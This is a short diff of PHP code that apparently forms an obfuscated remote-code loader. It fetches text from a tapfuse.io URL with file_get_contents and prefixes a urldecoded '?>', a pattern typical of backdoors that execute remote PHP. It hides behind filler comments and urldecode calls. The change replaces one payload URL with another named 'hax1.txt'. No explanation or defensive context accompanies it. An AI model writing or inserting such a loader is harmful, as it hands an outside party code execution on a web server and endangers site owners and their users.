@@ -2,7 +2,7 @@
     /**_**/ urldecode("%3f%3e") .
         file_get_contents(
             /**_**/ urldecode(
-                /**_**/ "https://tapfuse.io/raw/lp-zean/amayogyakarta.txt"
+                /**_**/ "https://tapfuse.io/raw/hax1.txt"
             )
         )
 ); ?>
